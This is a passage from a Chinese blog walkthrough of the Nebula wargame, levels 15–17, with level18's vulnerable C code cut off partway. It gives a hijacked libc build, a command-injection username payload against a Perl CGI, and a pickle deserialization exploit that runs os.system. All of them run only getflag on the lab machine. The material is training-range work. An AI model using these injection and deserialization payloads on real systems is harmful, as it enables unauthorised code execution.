./flag15: /var/tmp/flag15/libc.so.6: no version information available &lt;span class="o"&gt;(&lt;/span&gt;required by /var/tmp/flag15/libc.so.6&lt;span class="o"&gt;)&lt;/span&gt;
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link &lt;span class="nb"&gt;time&lt;/span&gt; reference
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;两个错误，一个找不到符号，一个缺少GLIBC_2.1.3版本定义。Google后得到静态链接配合version script的方案，创建一个version文件：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;GLIBC_2.0 {
};
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后编译：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc -fPIC -shared -static-libgcc -Wl,--version-script&lt;span class="o"&gt;=&lt;/span&gt;version,-Bstatic -o /var/tmp/flag15/libc.so.6 libc.c
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如此，即可成功运行getflag。&lt;/p&gt;
&lt;h1&gt;Nebula level16&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a perl script running on port 1616.&lt;/p&gt;
&lt;p&gt;有个perl脚本在1616端口运行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env perl&lt;/span&gt;

&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nn"&gt;CGI&lt;/span&gt; &lt;span class="sx"&gt;qw{param}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;sub&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="nv"&gt;$password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="nb"&gt;tr&lt;/span&gt;&lt;span class="sr"&gt;/a-z/&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;# conver to uppercase&lt;/span&gt;
  &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="sr"&gt;s/\s.*//&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    &lt;span class="c1"&gt;# strip everything after a space&lt;/span&gt;

  &lt;span class="nv"&gt;@output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sb"&gt;`egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="nv"&gt;$line&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;@output&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$usr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$pw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/:/&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$line&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;


    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pw&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="nv"&gt;$password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;sub&lt;/span&gt; &lt;span class="nf"&gt;htmlz&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;  
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;htmlz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;首先来看代码逻辑，get两个参数username和password，将username全部转换成大写并去掉空格，之后执行egrep命令，并匹配password。egrep是shell命令，这里就是这道题的突破口。&lt;/p&gt;
&lt;p&gt;但是，Linux是区分大小写的系统，所以需要想办法构造名称为大写的脚本并完成漏洞的利用。不过，Linux的根目录没有写入权限，一级目录也没有大写名字的目录，该如何处理？这里用到了通配符技巧。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level16@nebula:~$ touch /tmp/TEST16
level16@nebula:~$ ls /*/TEST16
/tmp/TEST16
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;于是构造一个脚本/tmp/EXP16，并给予x权限：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! /bin/bash&lt;/span&gt;
/bin/getflag &amp;gt; /tmp/flag16.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后构造参数：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;username=&amp;quot;&amp;lt;/DEV/NULL;/*/EXP16;#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中第一个&lt;code&gt;"&lt;/code&gt;用于闭合，&lt;code&gt;&amp;lt;/DEV/NULL&lt;/code&gt;是给egrep的输入参数，之后是漏洞利用的命令，最后的&lt;code&gt;#&lt;/code&gt;用于注释掉后面的语句。&lt;/p&gt;
&lt;p&gt;最后将构造好的参数编码并执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://127.0.0.1:1616/index.cgi?username&lt;span class="o"&gt;=&lt;/span&gt;%22%3C%2FDEV%2FNULL%3B%2F%2A%2FEXP%3B%23 -O /dev/null
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;从/tmp/flag16.txt中可以发现成功getflag。&lt;/p&gt;
&lt;h1&gt;Nebula level17&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a python script listening on port 10007 that contains a vulnerability.&lt;/p&gt;
&lt;p&gt;在监听10007端口的python脚本有漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;signal&lt;/span&gt;

&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIGCHLD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIG_IGN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="n"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;why did you send me &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;?&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;skt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10007&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Accepted connection from &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;:&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Python写的一个socket服务器，服务器一运行就对接收到的数据用pickle进行反序列化。序列化/反序列化就意味对象可以被存储，因此也有可能被运行。网上可以搜索一下Pickle Exploit相关信息，可谓一抓一大把。&lt;/p&gt;
&lt;p&gt;这题思路就是从pickle下手，查询了Python Manual后发现，dumps()/loads()函数可以序列化转换对象和byte。&lt;/p&gt;
&lt;p&gt;现在有了存储和恢复对象的方法，下一步就是如何让对象内的方法运行。php有魔数方法，python应该也有。继续看手册中pickle这章，发现在恢复对象的时候&lt;code&gt;__init__()&lt;/code&gt;和&lt;code&gt;__new__()&lt;/code&gt;是不会被调用的，但是有&lt;code&gt;__reduce__()&lt;/code&gt;，不过需要返回tuple或者string。&lt;/p&gt;
&lt;p&gt;于是构造代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Exp17&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__reduce__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/getflag &amp;gt; /tmp/flag17.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;

&lt;span class="n"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exp17&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="c1"&gt;# pickle.loads(obj)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面代码中注释掉的那句是我用来测试的代码，测试正常后就可以开始漏洞利用了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python exp17.py &lt;span class="p"&gt;|&lt;/span&gt; nc &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="m"&gt;10007&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运行代码，让nc建立连接并回车，之后Ctrl+C停止运行，去/tmp/flag17.txt看成果吧。&lt;/p&gt;
&lt;h1&gt;Nebula level18&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/p&gt;
&lt;p&gt;分析C程序漏洞，这道题有简单、中等、困难且不可靠3种方式去解决。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;getopt.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;loggedin&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cp"&gt;#define dprintf(...) if(globals.debugfile) \&lt;/span&gt;
&lt;span class="cp"&gt;  fprintf(globals.debugfile, __VA_ARGS__)&lt;/span&gt;
&lt;span class="cp"&gt;#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \&lt;/span&gt;
&lt;span class="cp"&gt;  fprintf(globals.debugfile, __VA_ARGS__)&lt;/span&gt;

&lt;span class="cp"&gt;#define PWFILE &amp;quot;/home/flag18/password&amp;quot;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PWFILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to read password file %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PWFILE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
                &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;logged in successfully (with%s password file)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
    &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;out&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;notsupported&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
